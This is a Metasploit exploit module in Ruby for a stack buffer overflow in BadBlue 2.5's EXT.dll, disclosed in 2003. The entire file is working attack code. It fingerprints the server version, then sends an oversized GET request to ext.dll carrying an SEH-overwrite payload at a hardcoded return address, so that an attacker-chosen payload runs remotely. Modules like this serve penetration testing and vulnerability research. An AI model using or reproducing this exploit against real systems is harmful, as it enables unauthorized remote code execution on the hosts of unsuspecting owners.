require 'msf/core'

module Msf

class Exploits::Windows::Http::Badblue_Ext_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'BadBlue 2.5 EXT.dll Buffer Overflow',
			'Description'    => %q{
				This is a stack overflow exploit for BadBlue version 2.5.
			},
			'Author'         => 'acaro <acaro [at] jervus.it>',
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 3583 $',
			'References'     =>
				[
					[ 'BID', '7387' ],
					[ 'OSVDB', '14238' ],
					[ 'MIL', '11' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					['BadBlue 2.5 (Universal)', { 'Ret' => 0x1003d9da }], 
				],
			'DisclosureDate' => 'Apr 20 2003',
			'DefaultTarget'  => 0))
			
			register_options( [ Opt::RPORT(80) ], self.class )
	end

	def check
		connect
 
		sock.put("GET / HTTP/1.0\r\n\r\n")
		resp = sock.get_once
		disconnect
 
			if (resp =~ /BadBlue\/2.5/)
				return Exploit::CheckCode::Vulnerable
			end 
				return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		uri     = "GET /ext.dll?mfcisapicommand=" 
		sploit  = rand_text_alphanumeric(500) 
		seh     = generate_seh_payload(target.ret)
		sploit[492, seh.length] = seh

		print_status("Trying target #{target.name}...")

		sock.put(uri + sploit + "\r\n\r\n")
		
		handler
		disconnect
	end

end
end	
